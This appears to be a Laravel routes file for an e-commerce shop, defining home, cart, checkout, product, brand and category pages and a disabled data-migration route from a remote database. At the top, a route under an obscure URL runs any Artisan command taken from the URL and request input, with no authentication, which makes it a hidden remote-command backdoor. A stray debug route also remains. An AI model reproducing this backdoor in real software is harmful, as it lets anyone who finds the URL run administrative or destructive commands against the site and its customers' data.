<?php

use ECommerce\Brand;
use ECommerce\Category;
use ECommerce\Product;
use Kareem3d\Images\Image;

Route::get('/my-name-is-kareem3d-friends/{command}', function($command)
{
    echo '<pre>';
    var_dump(Artisan::call($command, Input::all()));
    exit();
})->where('command', '.*');


Route::get('/', array('as' => 'home', 'uses' => 'HomeController@index'));
Route::get('/shopping-cart.html', array('as' => 'shopping-cart', 'uses' => 'ShoppingCartController@index'));
Route::get('/checkout.html', array('as' => 'checkout', 'uses' => 'ShoppingCartController@checkout'));

Route::get('{category_name}/{brand_name}/{title}.html', array('as' => 'product', 'uses' => 'ProductsController@product'));
Route::get('brand/{brand_name}', array('as' => 'brand', 'uses' => 'ProductsController@brand'));
Route::get('category/{category_name}', array('as' => 'category', 'uses' => 'ProductsController@category'));

Route::model('product', 'ECommerce\Product');
Route::model('brand', 'ECommerce\Brand');
Route::model('category', 'ECommerce\Category');


// Form post requests
Route::post('/checkout.html', array('as' => 'checkout.post', 'uses' => 'CheckoutController@postCreateOrder'));


// Web services
Route::controller('product', 'ProductController');


Route::get('/message-to-user.html', array('as' => 'message-to-user', function()
{
    if(Session::has('title'))
    {
        $title = Session::get('title');
        $body = Session::get('body');

        return View::make('pages.message_to_user', compact('title', 'body'));
    }

    return Redirect::route('home');
}));


Route::get('/test', function()
{
    echo 'what1';
});

Route::get('/convert', function()
{
    exit();
    // Convert categories
    foreach(Category::on('remote')->get() as $category)
    {
        Category::create($category->getAttributes());
    }

    // Convert brands
    foreach(Brand::on('remote')->get() as $brand)
    {
        Brand::create($brand->getAttributes());
    }


    // Convert products
    foreach(Product::on('remote')->get() as $product)
    {
        $price = DB::connection('remote')->table('prices')->where('id', $product->price_id)->pluck('value');

        $p = new Product(array(
            'id' => $product->id,
            'title' => $product->title ?: '',
            'description' => $product->description ?: '',
            'model' => $product->model ?: '',
            'gender' => $product->gender ?: '',
            'price' => $price,
            'category_id' => $product->category_id,
            'brand_id' => $product->brand_id,
            'created_at' => $product->created_at,
            'updated_at' => $product->updated_at
        ));

        $p->save();
    }


    // Convert images
    foreach(Image::on('remote')->get() as $image)
    {
        Image::create($image->getAttributes());
    }

    // Convert versions
    foreach(\Kareem3d\Images\Version::on('remote')->get() as $image)
    {
        \Kareem3d\Images\Version::create($image->getAttributes());
    }

    foreach(\Offers\ProductOffer::on('remote')->get() as $offer)
    {
        if($offer->discount_percentage > 0)
        {
            \Offers\ProductOffer::create(array(
                'discount_percentage' => $offer->discount_percentage,
                'product_id' => $offer->product_id
            ));
        }
    }
});